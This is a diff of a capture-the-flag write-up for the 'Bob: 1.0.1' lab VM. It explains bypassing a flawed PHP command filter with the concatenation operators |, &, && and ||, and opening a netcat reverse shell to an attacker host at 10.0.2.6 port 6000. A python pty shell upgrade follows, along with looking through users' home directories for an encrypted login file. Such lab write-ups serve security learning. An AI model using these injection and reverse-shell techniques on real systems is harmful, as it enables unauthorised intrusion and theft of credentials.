@@ -89,7 +89,8 @@ The download of `dev_shell.txt.bak` file with `curl` command, which is likely a 
 
 The filter is a very basic and limited security practice and as a matter of fact filter circumvention is possible like shown previously whit `id | ls` command. It is based on:
 - in the HTLM file, the PHP code that executes "security control" is bad written. The code trim the command taken as input and push it in an array, then executes control check only on cell zero, that is the principal command;
-- operand `|`, called _Pipe_, simply takes as input of the second command the output of the first one, but since `ls` doesn't do anything with its input the result of the concatenated input is just the output of `ls`.
+- operand `|`, called _Pipe_, simply takes as input of the second command the output of the first one, but since `ls` doesn't do anything with its input the result of the concatenated input is just the output of `ls`.  
+(Also other concatenation operators, such as `&`, `&&` and `||` worked as well)
 
 ### Execution
 Since the circumvention has been found, it's time to exploit it.  
@@ -116,7 +117,7 @@ Command options:
 - `-e /bin/bash` specifies the program to execute after connection, which is a shell Bash
 - `10.0.2.6 6000` are just hostname and port number of the server side.
 
-The attempt is to establish a remote Bash shell on Kali virtual machine, but the spawned process is only a basic Sh shell. In order to have a more versatile and powerful one, on the server side of the connection the following text line is written:
+The attempt is to establish a remote Bash shell on Kali virtual machine, but the spawned process is only a basic Sh shell. In order to have a more powerful and interactive one, on the server side of the connection the following text line is written:
 
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
@@ -124,9 +125,12 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 - `python -c` indicates the fact that the command following is executed by command line Python interpreter
 - `import pty;pty.spawn("/bin/bash")` imports a Python library and calls a function that spawns a Bash shell
 
+The remote shell established is a reverse shell since the server side is on attacker's machine and it is the target side that starts the connetcion to attacker.
+
 Now it is possible to look around and move in the file system of _Bob: 1.0.1_ machine. The current account is `www-data`, but it is needed to gain higher privileges to complete the challenge, in fact moving to the root directory of the file system and listing files with `ls -l` command it is possible to see that the `flag.txt` file can be opened only by root account because it is the legitimate owner.
 
-In the `/home` directory there are four other directories with person names  (_bob_, _elliot_, _jc_, _seb_). In the first one, on path `/home/bob/Documents` there are an encrypted file with name `login.txt.gpg` and another directory named "Secret".
+In the `/home` directory four other users are found: `bob`, `elliot`, `jc`, `seb`.  
+Opening the directory corresponding to user Bob, on path `/home/bob/Documents` there are an encrypted file with name `login.txt.gpg` and another directory named "Secret".
 
 On path `/home/bob/Documents/Secret/Keep_Out/No_Lookie_In_Here` there is a script `notes.sh`: executing it the output is a list of apparently no sense phrases.
 This output seams to have no meaning, but taking the first letter of each line the word 'HARPOCRATES' is composed (this is the name of an Egyptian divinity), maybe it is the passphrase for the encrypted file.
